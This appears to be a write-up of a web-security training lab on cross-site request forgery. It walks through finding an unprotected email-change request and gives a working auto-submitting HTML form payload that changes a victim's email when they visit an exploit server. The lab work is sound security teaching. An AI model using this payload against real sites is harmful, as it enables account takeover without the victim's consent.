## Lab Description:


<img width="1368" height="887" alt="image" src="https://github.com/user-attachments/assets/aa09e841-eebd-4da4-90cc-3a0e10e97813" />


## Solution:

Login as a normal user ```wiener:peter```

<img width="1901" height="738" alt="image" src="https://github.com/user-attachments/assets/2cce9260-ba48-477b-8c67-2ac43f8146b6" />

We can use the email change function to change the user email:


<img width="1910" height="620" alt="image" src="https://github.com/user-attachments/assets/a7a23594-deec-41c6-9ae1-e379c88e702f" />


When we change the user's email, the server will ressponse:

<img width="1580" height="523" alt="image" src="https://github.com/user-attachments/assets/4680b5cc-ad7d-43c2-ae53-068a99ebebcf" />

We know that the server could be CSRF attacks

Then, we go to the exploit server:

<img width="1911" height="895" alt="image" src="https://github.com/user-attachments/assets/3a3dab16-461a-4ade-bdb5-a82cd49c7b53" />

We need to pay attention that the exploit server will store the payload and when user visit this site, the payload will run and change the user's email, so we need to store a payload in the exploit server:

I use the payload:
```
<html>
    <body>
        <form action="https://0afd006b033ee36b81986170002500ae.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="sh1n@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
Fill it into body field:


<img width="1902" height="751" alt="Screenshot 2025-11-13 192812" src="https://github.com/user-attachments/assets/55addc07-35c0-47b1-ab3f-afe94e12739c" />



Then click ```Store``` and ```View exploit```:


<img width="1909" height="616" alt="image" src="https://github.com/user-attachments/assets/d926e25d-e8b0-4308-bd65-02d86a975935" />


The wiener's email has been changed to ```sh1n@evil-user.net```, then go to the exploit server and click ```Deliver exploit to victim```:


<img width="1902" height="752" alt="image" src="https://github.com/user-attachments/assets/f40d84c3-b0d2-4b58-9a44-3e0e7b5ca3e2" />

The lab has been solved !!!



